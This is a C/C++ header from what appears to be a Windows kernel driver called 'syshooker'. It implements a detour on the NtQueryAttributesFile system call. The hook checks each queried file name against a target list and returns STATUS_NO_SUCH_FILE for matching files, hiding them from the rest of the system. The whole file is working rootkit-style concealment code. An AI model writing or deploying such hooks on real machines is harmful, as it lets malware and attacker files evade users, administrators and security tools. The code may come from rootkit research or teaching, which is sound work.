#pragma once
#include "Settings.h"

typedef NTSTATUS(*NtQueryAttributesFile_t)(
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PFILE_BASIC_INFORMATION FileInformation
);

static UNICODE_STRING StringNtQueryAttributesFile = RTL_CONSTANT_STRING(L"NtQueryAttributesFile");
static NtQueryAttributesFile_t OriginalNtQueryAttributesFile = NULL;

NTSTATUS DetourNtQueryAttributesFile(
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PFILE_BASIC_INFORMATION FileInformation)
{
	if (ObjectAttributes &&
		ObjectAttributes->ObjectName &&
		ObjectAttributes->ObjectName->Buffer)
	{

		PWCHAR FileName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));

		if (FileName)
		{
			memset(FileName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
			memcpy(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

			// kprintf("[+] syshooker: NtQueryAttributesFile: %ws\n", FileName);

			// find the last L'\\' in the FileName to extract the file name itself from the full path
			wchar_t* LastBackslash = wcsrchr(FileName, L'\\');

			// if L'\\' was not found, pass the whole FileName to the matching function
			// otherwise pass the remaining string AFTER the last backslash
			// in other words - the extracted filename
			if (matchSyshookerNames(LastBackslash == nullptr ? FileName : LastBackslash + 1, (Target)TARGET_FILE)) {
				kprintf("[+] syshooker: NtQueryAttributesFile: hiding %ws\n", FileName);
				ExFreePool(FileName);
				return STATUS_NO_SUCH_FILE;
			}

			ExFreePool(FileName);
		}
	}

	// we don't hide this file, return the original call
	return OriginalNtQueryAttributesFile(ObjectAttributes, FileInformation);
}